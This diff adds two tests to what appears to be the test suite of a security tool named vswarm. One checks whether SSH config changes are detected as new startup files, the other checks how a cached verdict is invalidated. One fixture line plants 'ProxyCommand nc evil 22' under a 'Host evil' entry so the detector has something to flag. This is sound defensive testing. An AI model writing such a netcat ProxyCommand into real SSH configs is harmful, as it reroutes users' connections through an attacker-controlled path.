@@ -1236,3 +1236,36 @@ process.stdin.on("data", d => { for (const l of String(d).split("\\n")) { let m;
     });
   });
 });
+
+describe("vswarm's own changes and the cached verdict", () => {
+  test("a file holding nothing but vswarm's block is not a new startup file; one line more makes it one", async () => {
+    process.env.VSWARM_SEC_DIR = tmp("sec");
+    const home = tmp("home");
+    try {
+      const block = "# >>> vswarm gate >>>\nMatch originalhost prod-* !exec \"/v/vswarm preflight --quiet --host %h\"\n# <<< vswarm gate <<<\n";
+      recordManaged(block);
+      mkdirSync(join(home, ".ssh"));
+      writeFileSync(join(home, ".ssh", "config"), block + "\n\n");
+      const ctx = { home, system: false, pathDirs: [], host: "t", user: "t", run: async () => undefined } as unknown as Ctx;
+      expect((await startupFiles(ctx)).items.filter((i) => i.id === ".ssh/config")).toEqual([]);
+      writeFileSync(join(home, ".ssh", "config"), block + "\nHost evil\n  ProxyCommand nc evil 22\n");
+      expect((await startupFiles(ctx)).items.filter((i) => i.id === ".ssh/config").length).toBe(1);
+    } finally {
+      delete process.env.VSWARM_SEC_DIR;
+    }
+  });
+
+  test("accepting findings or taking a baseline makes the gate check again instead of reusing the last verdict", () => {
+    const { decisionsSince, saveAccepted } = require("../src/sec/store");
+    process.env.VSWARM_SEC_DIR = tmp("sec");
+    try {
+      const at = Date.now() - 1000;
+      expect(decisionsSince(at)).toBe(false);
+      saveAccepted({});
+      expect(decisionsSince(at)).toBe(true);
+      expect(decisionsSince(Date.now() + 1000)).toBe(false);
+    } finally {
+      delete process.env.VSWARM_SEC_DIR;
+    }
+  });
+});
